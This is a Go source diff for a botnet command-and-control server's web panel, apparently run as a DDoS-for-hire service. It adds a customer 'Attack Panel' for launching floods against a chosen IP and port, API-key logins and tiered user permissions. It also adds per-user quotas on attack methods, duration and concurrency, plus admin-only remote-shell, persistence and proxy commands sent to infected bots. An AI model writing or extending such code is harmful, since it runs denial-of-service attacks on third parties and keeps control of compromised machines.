@@ -21,6 +21,103 @@ import (
 //go:embed web/login.html web/dashboard.html web/style.css web/app.js
 var webFS embed.FS
 
+const apiPanelHTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Attack Panel</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;display:flex;justify-content:center;padding:40px 20px}
+.panel{max-width:600px;width:100%}
+h1{font-size:20px;margin-bottom:24px;color:#58a6ff}
+.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:16px}
+.card h2{font-size:14px;color:#8b949e;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:8px}
+.stat{text-align:center}
+.stat .val{font-size:24px;font-weight:600;color:#58a6ff}
+.stat .lbl{font-size:11px;color:#8b949e;margin-top:2px}
+.methods{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
+.methods span{background:#21262d;border:1px solid #30363d;border-radius:4px;padding:3px 8px;font-size:12px;color:#7ee787}
+label{display:block;font-size:12px;color:#8b949e;margin-bottom:4px;margin-top:12px}
+select,input{width:100%;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:6px;padding:8px 12px;font-size:14px}
+.row{display:flex;gap:12px}
+.row>div{flex:1}
+button.send{width:100%;margin-top:16px;padding:10px;background:#238636;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer}
+button.send:hover{background:#2ea043}
+button.stop{width:100%;margin-top:8px;padding:8px;background:#da3633;color:#fff;border:none;border-radius:6px;font-size:13px;cursor:pointer}
+.toast{position:fixed;top:20px;right:20px;padding:10px 20px;border-radius:6px;font-size:13px;display:none;z-index:999}
+.toast.ok{background:#238636;color:#fff;display:block}
+.toast.err{background:#da3633;color:#fff;display:block}
+.running{margin-top:8px}
+.running .atk{background:#21262d;border:1px solid #30363d;border-radius:4px;padding:8px 12px;margin-top:6px;font-size:13px;display:flex;justify-content:space-between}
+#logout-btn{position:fixed;top:16px;right:20px;background:none;border:1px solid #30363d;color:#8b949e;padding:4px 12px;border-radius:4px;font-size:12px;cursor:pointer}
+</style>
+</head>
+<body>
+<button id="logout-btn" onclick="location.href='/logout'">Logout</button>
+<div class="panel">
+<h1>Attack Panel</h1>
+<div class="card" id="info-card"><h2>Loading...</h2></div>
+<div class="card">
+<h2>Launch Attack</h2>
+<label>Method</label>
+<select id="atk-method"></select>
+<div class="row">
+<div><label>Target IP</label><input id="atk-target" placeholder="1.2.3.4"></div>
+<div><label>Port</label><input id="atk-port" placeholder="80" style="width:80px"></div>
+<div><label>Duration (s)</label><input id="atk-dur" placeholder="30" style="width:80px"></div>
+</div>
+<button class="send" onclick="sendAttack()">Launch Attack</button>
+<button class="stop" onclick="stopAttack()">Stop All Attacks</button>
+</div>
+<div class="card"><h2>Running Attacks</h2><div id="running-list" class="running"><em style="color:#8b949e;font-size:13px">None</em></div></div>
+</div>
+<div id="toast" class="toast"></div>
+<script>
+var me=null;
+function toast(msg,ok){var t=document.getElementById('toast');t.textContent=msg;t.className='toast '+(ok?'ok':'err');setTimeout(function(){t.className='toast'},3000)}
+function load(){
+  fetch('/api/me').then(function(r){return r.json()}).then(function(d){
+    me=d;
+    var h='<h2>Your Account</h2><div class="stats">';
+    h+='<div class="stat"><div class="val">'+d.bot_count+'</div><div class="lbl">Bots</div></div>';
+    h+='<div class="stat"><div class="val">'+d.maxtime+'s</div><div class="lbl">Max Time</div></div>';
+    h+='<div class="stat"><div class="val">'+d.concurrents+'</div><div class="lbl">Concurrents</div></div>';
+    h+='</div><div class="methods">';
+    (d.methods||[]).forEach(function(m){h+='<span>'+m+'</span>'});
+    h+='</div>';
+    document.getElementById('info-card').innerHTML=h;
+    var sel=document.getElementById('atk-method');
+    sel.innerHTML='';
+    (d.methods||[]).forEach(function(m){var o=document.createElement('option');o.value=m;o.textContent=m;sel.appendChild(o)});
+    var rl=document.getElementById('running-list');
+    if(d.running_attacks&&d.running_attacks.length){
+      rl.innerHTML='';
+      d.running_attacks.forEach(function(a){rl.innerHTML+='<div class="atk"><span>'+a.method+' &rarr; '+a.target+':'+a.port+'</span><span>'+a.remaining+'s left</span></div>'});
+    }else{rl.innerHTML='<em style="color:#8b949e;font-size:13px">None</em>'}
+  }).catch(function(){document.getElementById('info-card').innerHTML='<h2>Error loading account</h2>'});
+}
+function sendAttack(){
+  var m=document.getElementById('atk-method').value;
+  var t=document.getElementById('atk-target').value.trim();
+  var p=document.getElementById('atk-port').value.trim()||'80';
+  var d=document.getElementById('atk-dur').value.trim()||'30';
+  if(!t){toast('Enter a target IP',false);return}
+  var cmd='!'+m+' '+t+' '+p+' '+d;
+  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd})})
+  .then(function(r){return r.json()}).then(function(j){toast(j.message,j.success);if(j.success)setTimeout(load,1000)}).catch(function(){toast('Request failed',false)});
+}
+function stopAttack(){
+  fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'!stop'})})
+  .then(function(r){return r.json()}).then(function(j){toast(j.message,j.success);setTimeout(load,1000)}).catch(function(){toast('Request failed',false)});
+}
+load();setInterval(load,10000);
+</script>
+</body>
+</html>`
+
 var (
 	webSessions     = make(map[string]*WebSession)
 	webSessionsLock sync.RWMutex
@@ -49,8 +146,56 @@ var (
 type WebSession struct {
 	Username  string
 	Level     string
+	IsAPIKey  bool
 	CreatedAt time.Time
 	ExpiresAt time.Time
+}
+
+// Permission helpers — mirror the telnet client helpers from miscellaneous.go
+func (s *WebSession) GetLevel() level {
+	switch s.Level {
+	case "Owner":
+		return Owner
+	case "Admin":
+		return Admin
+	case "Pro":
+		return Pro
+	default:
+		return Basic
+	}
+}
+
+func (s *WebSession) isOwner() bool {
+	return s.GetLevel() == Owner
+}
+
+func (s *WebSession) canUseShell() bool {
+	l := s.GetLevel()
+	return l == Admin || l == Owner
+}
+
+func (s *WebSession) canUseBotManagement() bool {
+	l := s.GetLevel()
+	return l == Admin || l == Owner
+}
+
+func (s *WebSession) canTargetSpecificBot() bool {
+	l := s.GetLevel()
+	return l == Pro || l == Admin || l == Owner
+}
+
+// lookupUser loads the full User record for this session from users.json
+func (s *WebSession) lookupUser() *User {
+	users, err := loadUsers()
+	if err != nil {
+		return nil
+	}
+	for _, u := range users {
+		if u.Username == s.Username {
+			return &u
+		}
+	}
+	return nil
 }
 
 type ActivityLogEntry struct {
@@ -169,17 +314,31 @@ func writeJSON(w http.ResponseWriter, status int, v interface{}) {
 }
 
 func getWebSession(r *http.Request) *WebSession {
+	// Try cookie-based session first
 	cookie, err := r.Cookie("vps")
-	if err != nil {
-		return nil
+	if err == nil {
+		webSessionsLock.RLock()
+		sess, ok := webSessions[cookie.Value]
+		webSessionsLock.RUnlock()
+		if ok && time.Now().Before(sess.ExpiresAt) {
+			return sess
+		}
 	}
-	webSessionsLock.RLock()
-	defer webSessionsLock.RUnlock()
-	sess, ok := webSessions[cookie.Value]
-	if !ok || time.Now().After(sess.ExpiresAt) {
-		return nil
+	// Try X-API-Key header (creates ephemeral session)
+	apiKey := r.Header.Get("X-API-Key")
+	if apiKey != "" {
+		user := AuthByAPIKey(apiKey)
+		if user != nil {
+			return &WebSession{
+				Username:  user.Username,
+				Level:     user.Level,
+				IsAPIKey:  true,
+				CreatedAt: time.Now(),
+				ExpiresAt: time.Now().Add(1 * time.Hour),
+			}
+		}
 	}
-	return sess
+	return nil
 }
 
 func requireWebAuth(next http.HandlerFunc) http.HandlerFunc {
@@ -196,6 +355,28 @@ func requireWebAuth(next http.HandlerFunc) http.HandlerFunc {
 		}
 		next(w, r)
 	}
+}
+
+func requireOwner(next http.HandlerFunc) http.HandlerFunc {
+	return requireWebAuth(func(w http.ResponseWriter, r *http.Request) {
+		sess := getWebSession(r)
+		if sess == nil || !sess.isOwner() {
+			writeJSON(w, http.StatusForbidden, map[string]interface{}{"error": "owner access required"})
+			return
+		}
+		next(w, r)
+	})
+}
+
+func requireAdmin(next http.HandlerFunc) http.HandlerFunc {
+	return requireWebAuth(func(w http.ResponseWriter, r *http.Request) {
+		sess := getWebSession(r)
+		if sess == nil || !sess.canUseBotManagement() {
+			writeJSON(w, http.StatusForbidden, map[string]interface{}{"error": "admin access required"})
+			return
+		}
+		next(w, r)
+	})
 }
 
 func cleanupExpiredSessions() {
@@ -242,12 +423,14 @@ func NewWebMux() http.Handler {
 	mux.HandleFunc("/api/attack-methods", requireWebAuth(handleAPIAttackMethods))
 	mux.HandleFunc("/api/attacks", requireWebAuth(handleAPIRunningAttacks))
 	mux.HandleFunc("/api/events", requireWebAuth(handleSSE))
-	mux.HandleFunc("/api/users", requireWebAuth(handleAPIUsers))
-	mux.HandleFunc("/api/relays", requireWebAuth(handleAPIRelays))
-	mux.HandleFunc("/api/tasks", requireWebAuth(handleAPITasks))
+	mux.HandleFunc("/api/users", requireOwner(handleAPIUsers))
+	mux.HandleFunc("/api/relays", requireAdmin(handleAPIRelays))
+	mux.HandleFunc("/api/tasks", requireAdmin(handleAPITasks))
+	mux.HandleFunc("/api/me", requireWebAuth(handleAPIMe))
+	mux.HandleFunc("/api/auth/apikey", handleAPIAuthByKey)
 	mux.HandleFunc("/static/style.css", handleStaticCSS)
 	mux.HandleFunc("/static/app.js", handleStaticJS)
-	mux.HandleFunc("/ws/shell", requireWebAuth(handleWebShellWS))
+	mux.HandleFunc("/ws/shell", requireAdmin(handleWebShellWS))
 	mux.HandleFunc("/", requireWebAuth(handleDashboard))
 
 	return securityHeaders(mux)
@@ -400,11 +583,108 @@ func handleWebLogout(w http.ResponseWriter, r *http.Request) {
 	http.Redirect(w, r, "/login", http.StatusSeeOther)
 }
 
+// handleAPIAuthByKey authenticates via API key and creates a cookie session.
+func handleAPIAuthByKey(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	var body struct {
+		APIKey string `json:"api_key"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "invalid json"})
+		return
+	}
+	user := AuthByAPIKey(body.APIKey)
+	if user == nil {
+		writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"success": false, "error": "invalid API key"})
+		return
+	}
+	sessID := generateSessionID()
+	webSessionsLock.Lock()
+	webSessions[sessID] = &WebSession{
+		Username:  user.Username,
+		Level:     user.Level,
+		IsAPIKey:  true,
+		CreatedAt: time.Now(),
+		ExpiresAt: time.Now().Add(24 * time.Hour),
+	}
+	webSessionsLock.Unlock()
+
+	http.SetCookie(w, &http.Cookie{
+		Name:     "vps",
+		Value:    sessID,
+		Path:     "/",
+		HttpOnly: true,
+		MaxAge:   86400,
+		SameSite: http.SameSiteLaxMode,
+	})
+
+	PushActivity("login", fmt.Sprintf("%s logged in via API key", user.Username))
+	writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})
+}
+
+// handleAPIMe returns the current session user's details and permissions.
+func handleAPIMe(w http.ResponseWriter, r *http.Request) {
+	sess := getWebSession(r)
+	if sess == nil {
+		writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"error": "unauthorized"})
+		return
+	}
+	user := sess.lookupUser()
+	if user == nil {
+		writeJSON(w, http.StatusInternalServerError, map[string]interface{}{"error": "user not found"})
+		return
+	}
+
+	// Count running attacks for this user
+	ongoingAttacksLock.RLock()
+	var running []map[string]interface{}
+	for _, a := range ongoingAttacks {
+		rem := a.duration - time.Since(a.start)
+		if rem > 0 && a.username == sess.Username {
+			running = append(running, map[string]interface{}{
+				"method":    a.method,
+				"target":    a.ip,
+				"port":      a.port,
+				"remaining": int(rem.Seconds()),
+			})
+		}
+	}
+	ongoingAttacksLock.RUnlock()
+	if running == nil {
+		running = make([]map[string]interface{}, 0)
+	}
+
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"username":        user.Username,
+		"level":           user.Level,
+		"methods":         user.Methods,
+		"maxtime":         user.Maxtime,
+		"concurrents":     user.Concurrents,
+		"maxbots":         user.Maxbots,
+		"bot_count":       getBotCount(),
+		"running_attacks": running,
+		"is_api_key":      sess.IsAPIKey,
+	})
+}
+
 func handleDashboard(w http.ResponseWriter, r *http.Request) {
 	if r.URL.Path != "/" {
 		http.NotFound(w, r)
 		return
 	}
+
+	sess := getWebSession(r)
+
+	// API key sessions get the stripped-down customer panel
+	if sess != nil && sess.IsAPIKey {
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		w.Write([]byte(apiPanelHTML))
+		return
+	}
+
 	data, _ := webFS.ReadFile("web/dashboard.html")
 	// Inject baked-in config as JS globals before </head>
 	inject := fmt.Sprintf("<script>var DEFAULT_PROXY_USER=%q,DEFAULT_PROXY_PASS=%q;</script>",
@@ -497,7 +777,7 @@ func handleAPIStats(w http.ResponseWriter, r *http.Request) {
 }
 
 // trackWebAttack parses attack commands from the web panel and adds them to ongoingAttacks.
-func trackWebAttack(cmd string) {
+func trackWebAttack(cmd string, username string) {
 	fields := strings.Fields(cmd)
 	if len(fields) < 4 {
 		return
@@ -521,6 +801,7 @@ func trackWebAttack(cmd string) {
 		port:     fields[2],
 		duration: dur,
 		start:    time.Now(),
+		username: username,
 	}
 	ongoingAttacksLock.Lock()
 	ongoingAttackSeq++
@@ -542,6 +823,12 @@ func handleAPICommand(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	sess := getWebSession(r)
+	if sess == nil {
+		writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"success": false, "message": "Unauthorized"})
+		return
+	}
+
 	var req struct {
 		Command string `json:"command"`
 		BotID   string `json:"botID"`
@@ -557,8 +844,91 @@ func handleAPICommand(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// ---- Permission checks based on command type ----
+	cmdWord := strings.Fields(cmd)[0]
+	cmdLower := strings.ToLower(cmdWord)
+
+	// Shell commands: Admin+ only
+	shellCmds := map[string]bool{"!shell": true, "!exec": true, "!stream": true, "!detach": true, "!bg": true}
+	if shellCmds[cmdLower] && !sess.canUseShell() {
+		writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": "Shell access requires Admin or Owner"})
+		return
+	}
+
+	// Bot management: Admin+ only
+	mgmtCmds := map[string]bool{
+		"!reinstall": true, "!kill": true, "!lolnogtfo": true, "!persist": true,
+		"!socks": true, "!stopsocks": true, "!socksauth": true,
+		"!updatefetch": true, "!exit": true, "!download": true, "!upload": true,
+	}
+	if mgmtCmds[cmdLower] && !sess.canUseBotManagement() {
+		writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": "Bot management requires Admin or Owner"})
+		return
+	}
+
+	// Attack commands: validate method, maxtime, concurrents against user record
+	attackCmds := map[string]bool{
+		"!udpflood": true, "!tcpflood": true, "!http": true, "!https": true,
+		"!tls": true, "!syn": true, "!ack": true, "!gre": true, "!dns": true,
+		"!cfbypass": true, "!rapidreset": true,
+	}
+	if attackCmds[cmdLower] {
+		user := sess.lookupUser()
+		if user == nil {
+			writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": "User not found"})
+			return
+		}
+
+		// Check method is in user's allowed list
+		methodName := strings.TrimPrefix(cmdLower, "!")
+		allowed := false
+		for _, m := range user.Methods {
+			if strings.EqualFold(m, methodName) || strings.EqualFold(m, cmdLower) {
+				allowed = true
+				break
+			}
+		}
+		if !allowed {
+			writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": fmt.Sprintf("Method %s not available for your account", methodName)})
+			return
+		}
+
+		// Check duration <= maxtime
+		fields := strings.Fields(cmd)
+		if len(fields) >= 4 {
+			dur := 0
+			fmt.Sscanf(fields[3], "%d", &dur)
+			if user.Maxtime > 0 && dur > user.Maxtime {
+				writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": fmt.Sprintf("Duration exceeds your limit (%ds max)", user.Maxtime)})
+				return
+			}
+		}
+
+		// Check concurrent attack limit
+		if user.Concurrents > 0 {
+			ongoingAttacksLock.RLock()
+			running := 0
+			for _, a := range ongoingAttacks {
+				if a.username == sess.Username && time.Since(a.start) < a.duration {
+					running++
+				}
+			}
+			ongoingAttacksLock.RUnlock()
+			if running >= user.Concurrents {
+				writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": fmt.Sprintf("Concurrent limit reached (%d/%d)", running, user.Concurrents)})
+				return
+			}
+		}
+	}
+
+	// Bot targeting: Pro+ can target specific bots, Basic broadcasts only
+	if req.BotID != "" && !sess.canTargetSpecificBot() {
+		writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": "Targeting specific bots requires Pro or higher"})
+		return
+	}
+
 	// Track attack commands in ongoingAttacks so the live panel works
-	trackWebAttack(cmd)
+	trackWebAttack(cmd, sess.Username)
 
 	if req.BotID != "" {
 		ok := sendToSingleBot(req.BotID, cmd)
@@ -747,6 +1117,7 @@ func handleAPIUsers(w http.ResponseWriter, r *http.Request) {
 			Concurrents int      `json:"concurrents"`
 			Maxbots     int      `json:"maxbots"`
 			Methods     []string `json:"methods"`
+			APIKey      string   `json:"api_key"`
 		}
 		safe := make([]safeUser, len(users))
 		for i, u := range users {
@@ -755,6 +1126,7 @@ func handleAPIUsers(w http.ResponseWriter, r *http.Request) {
 				Expire: u.Expire.Format(time.RFC3339),
 				Maxtime: u.Maxtime, Concurrents: u.Concurrents,
 				Maxbots: u.Maxbots, Methods: u.Methods,
+				APIKey: u.APIKey,
 			}
 		}
 		writeJSON(w, http.StatusOK, safe)
@@ -798,6 +1170,7 @@ func handleAPIUsers(w http.ResponseWriter, r *http.Request) {
 		}
 		users = append(users, User{
 			Username: req.Username, Password: req.Password,
+			APIKey: generateAPIKey(),
 			Level: req.Level, Expire: expire,
 			Maxtime: req.Maxtime, Concurrents: req.Concurrents,
 			Maxbots: req.Maxbots, Methods: req.Methods,
